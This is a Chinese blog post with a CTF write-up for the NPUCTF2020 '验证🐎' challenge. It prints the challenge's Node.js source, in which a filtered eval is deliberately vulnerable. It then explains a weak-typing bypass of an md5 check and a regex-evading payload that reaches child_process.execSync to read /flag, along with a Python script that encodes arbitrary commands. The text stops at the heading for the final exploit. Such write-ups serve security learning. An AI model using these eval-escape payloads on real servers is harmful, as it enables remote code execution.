@@ -1,0 +1,288 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[NPUCTF2020]验证🐎 | 早起大王的世界</title><meta name="author" content="早起大王"><meta name="copyright" content="早起大王"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目界面：  点击链接出现JS源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[NPUCTF2020]验证🐎">
+<meta property="og:url" content="https://fu163.github.io/2025/05/26/c1e0de8de76a330f8763aaca37bd2c28_22215bbcae78e3da94be67df0ea089a4_8/index.html">
+<meta property="og:site_name" content="早起大王的世界">
+<meta property="og:description" content="题目界面：  点击链接出现JS源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fu163.github.io/img/5.jpg">
+<meta property="article:published_time" content="2025-05-26T06:54:18.000Z">
+<meta property="article:modified_time" content="2025-06-02T08:27:17.104Z">
+<meta property="article:author" content="早起大王">
+<meta property="article:tag" content="JS弱类型比较">
+<meta property="article:tag" content="Node.Js">
+<meta property="article:tag" content="hash绕过">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fu163.github.io/img/5.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[NPUCTF2020]验证🐎",
+  "url": "https://fu163.github.io/2025/05/26/c1e0de8de76a330f8763aaca37bd2c28_22215bbcae78e3da94be67df0ea089a4_8/",
+  "image": "https://fu163.github.io/img/5.jpg",
+  "datePublished": "2025-05-26T06:54:18.000Z",
+  "dateModified": "2025-06-02T08:27:17.104Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "早起大王",
+      "url": "https://fu163.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://fu163.github.io/2025/05/26/c1e0de8de76a330f8763aaca37bd2c28_22215bbcae78e3da94be67df0ea089a4_8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[NPUCTF2020]验证🐎',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fa-brands fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/5.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/log.jpg" alt="Logo"><span class="site-name">早起大王的世界</span></a><a class="nav-page-title" href="/"><span class="site-name">[NPUCTF2020]验证🐎</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fa-brands fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书籍</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[NPUCTF2020]验证🐎</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-26T06:54:18.000Z" title="发表于 2025-05-26 14:54:18">2025-05-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-02T08:27:17.104Z" title="更新于 2025-06-02 16:27:17">2025-06-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98/">刷题</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p> 题目界面：</p>
+<p><img src="/../images/0250526145943465.png" alt="image-20250526145943465"></p>
+<p>点击链接出现JS源码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入所需模块</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); <span class="comment">// Express web框架</span></span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>); <span class="comment">// 解析HTTP请求体的中间件</span></span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>); <span class="comment">// 基于cookie的session中间件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>); <span class="comment">// 文件系统模块</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>); <span class="comment">// 加密模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).<span class="property">keys</span>; <span class="comment">// 导入密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// MD5哈希函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>) <span class="comment">// 创建MD5哈希</span></span><br><span class="line">    .<span class="title function_">update</span>(s) <span class="comment">// 更新哈希内容</span></span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>); <span class="comment">// 以16进制格式输出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;更安全&quot;的eval函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">saferEval</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="comment">// 过滤掉非数学表达式、运算符和数字的字符</span></span><br><span class="line">  <span class="keyword">if</span> (str.<span class="title function_">replace</span>(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果包含非法字符返回null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str); <span class="comment">// 否则执行eval</span></span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 注：上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取模板文件</span></span><br><span class="line"><span class="keyword">const</span> template = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.html&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"><span class="comment">// 渲染结果到模板</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span>(<span class="params">results</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> template.<span class="title function_">replace</span>(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.<span class="title function_">join</span>(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>)); <span class="comment">// 将结果数组用&lt;br/&gt;连接后插入模板</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Express应用</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用中间件</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;)); <span class="comment">// 解析application/x-www-form-urlencoded</span></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>()); <span class="comment">// 解析application/json</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用cookie-session中间件</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieSession</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 注：嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys <span class="comment">// 使用导入的密钥</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 冻结Object和Math对象防止修改</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>);</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Math</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理POST请求</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.<span class="property">session</span>.<span class="property">results</span> || []; <span class="comment">// 获取session中的结果数组或初始化</span></span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.<span class="property">body</span>; <span class="comment">// 从请求体中解构参数</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 验证first和second</span></span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.<span class="property">length</span> === second.<span class="property">length</span> &amp;&amp; first!==second &amp;&amp; <span class="title function_">md5</span>(first+keys[<span class="number">0</span>]) === <span class="title function_">md5</span>(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">e</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试安全地执行表达式</span></span><br><span class="line">        result = <span class="title function_">saferEval</span>(req.<span class="property">body</span>.<span class="property">e</span>) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 将表达式和结果添加到结果数组开头</span></span><br><span class="line">      results.<span class="title function_">unshift</span>(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.<span class="title function_">unshift</span>(<span class="string">&#x27;Not verified!&#x27;</span>); <span class="comment">// 验证失败</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 限制结果数组长度不超过13</span></span><br><span class="line">  <span class="keyword">if</span> (results.<span class="property">length</span> &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.<span class="title function_">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  req.<span class="property">session</span>.<span class="property">results</span> = results; <span class="comment">// 保存结果到session</span></span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title function_">render</span>(req.<span class="property">session</span>.<span class="property">results</span>)); <span class="comment">// 渲染并返回结果</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 注：老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>); <span class="comment">// 设置响应头</span></span><br><span class="line">  res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./index.js&#x27;</span>)); <span class="comment">// 返回当前文件内容</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理根路径GET请求</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>); <span class="comment">// 设置响应头</span></span><br><span class="line">  req.<span class="property">session</span>.<span class="property">admin</span> = req.<span class="property">session</span>.<span class="property">admin</span> || <span class="number">0</span>; <span class="comment">// 初始化admin session</span></span><br><span class="line">  res.<span class="title function_">send</span>(<span class="title function_">render</span>(req.<span class="property">session</span>.<span class="property">results</span> = req.<span class="property">session</span>.<span class="property">results</span> || [])) <span class="comment">// 渲染并返回结果</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器监听80端口</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>) <span class="comment">// 启动日志</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>有 eval ，但是需要过两个关卡</p>
+<h2 id="JS弱类型比较"><a href="#JS弱类型比较" class="headerlink" title="JS弱类型比较"></a>JS弱类型比较</h2><p>第一个是 一个if判断</p>
+<p><code>if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) &#123;</code><br>意思是first和second两个参数需要<strong>长度相同，互不相等，加 key[0] 之后 md5 相等</strong></p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><img src="/../images/20250526150806555.png" alt="image-20250526150806555"></p>
+<p>可以看到数组[1]&#x3D;&#x3D;1在两个等于号时候是返回true的，而在三个等于号时候会返回false。这一点是和php一样的。</p>
+<p>在JavaScript中各个数据类型的相加的结果， 可以看到对象和字符串相加最后得到的是字符串，而数组和字符串相加最后也是得到字符串，</p>
+<p>所以可以基本得出结论就是，<strong>node中任何数据类型和字符串相加最后得到的都是字符串</strong>。</p>
+<p><img src="/../images/20250526150905591.png" alt="image-20250526150905591"></p>
+<p><img src="/../images/20250526151009449.png" alt="image-20250526151009449"></p>
+<p>而<strong>长度length 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有length 的</strong>。</p>
+<p>因此，根据题意，我们可以构造这样的payload进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;e&quot;:playlod,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125; //因为是通过JSON来解析的</span><br></pre></td></tr></table></figure>
+
+<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function saferEval(str) &#123;</span><br><span class="line">  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#x27;&#x27;)) &#123;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这还有个超大正则</p>
+<p>看一下正则的解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">把满足正则表达式的部分全都删掉后传入的str为空才可以成功执行。</span><br><span class="line"></span><br><span class="line">看一下这个正则，第一部分是类似Math.xxx或只有Math这样的的，第二部分是可以包括这些字符：</span><br><span class="line">[()+\-*/&amp;|^%&lt;&gt;=,?:</span><br><span class="line"></span><br><span class="line">第三部分是以一定数字开头，然后跟0或者1个点，然后任意的数字，然后0或者一个类似e1111这样的。感觉这是整数，浮点数和科学计数法。</span><br><span class="line"></span><br><span class="line">形象解释：</span><br><span class="line">(?:Math(?:\.\w+)?)：匹配 Math.[0-9a-z]</span><br><span class="line">[()+\-*/&amp;|^%&lt;&gt;=,?:]：匹配中括号内任意一个字符（\-为减号）</span><br><span class="line">(?:\d+\.?\d*(?:e\d+)?)：匹配 数字开头 一个或零个点 一个或零个 e[0-9]</span><br><span class="line">：匹配空格</span><br></pre></td></tr></table></figure>
+
+<p>先看大佬的POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Math=&gt;(</span><br><span class="line">    Math=Math.constructor,</span><br><span class="line">    Math.x=Math.constructor(</span><br><span class="line">        Math.fromCharCode(</span><br><span class="line">114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)</span><br><span class="line">        )()))(Math+1)</span><br></pre></td></tr></table></figure>
+
+<p>一步步解释：</p>
+<p><code>Math</code>本身是一个 object</p>
+<p>用一个例子来解释Math&#x3D;&gt;的意思</p>
+<p><img src="/../images/20250526151942962.png" alt="image-20250526151942962"></p>
+<p>同理<code>a = x=&gt;x*x</code> 相当于命名了一个名字为a的函数</p>
+<p>那么<code>(x=&gt;x+x)(2)</code>呢其实就相当于往这个函数里面传入参数2</p>
+<p><img src="/../images/20250526152212095.png" alt="image-20250526152212095"></p>
+<p>我们再回到payload本身<code>(Math=Math.constructor,Math.x=Math.constructor(......))</code> 可以清楚地看到最外层括号是一个逗号运算，而逗号运算我们知道是从左往右运算再最后返回最右边的值。我们由此得知这里是执行这么个运算：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.constructor.constructor(.....)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/20250526152404120.png" alt="image-20250526152404120"></p>
+<p>可以见到第一层返回的<code>function object()</code>,他是function的对象原型，而我们知道Object的构造器是指向Function的所以第二层会出现Function。而Function是构造函数他能够创建函数。可以简单理解他和eval类似</p>
+<p>最终返回的是一个 <code>Function</code>，在 js 中 每个 JavaScript 函数实际上都是一个 <code>Function</code> 对象。它可以动态的创建一个函数，还是看例子</p>
+<p><img src="/../images/20250526152431327.png" alt="image-20250526152431327"></p>
+<p>那整个的一个结果就是创建函数，返回执行命令</p>
+<p>可以写一个生成payload的脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def gen(cmd):  </span><br><span class="line">s = f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;&#123;cmd&#125;&#x27;).toString()&quot;  </span><br><span class="line">return &#x27;,&#x27;.join([str(ord(i)) for i in s])  </span><br><span class="line">  </span><br><span class="line">print(&#x27;String.fromCharCode(&#x27;+gen(&#x27;ls&#x27;)+&#x27;)&#x27;)</span><br><span class="line"></span><br><span class="line"># String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,108,115,39,41,46,116,111,83,116,114,105,110,103,40,41)</span><br></pre></td></tr></table></figure>
+
+<p>最终exp:</p>
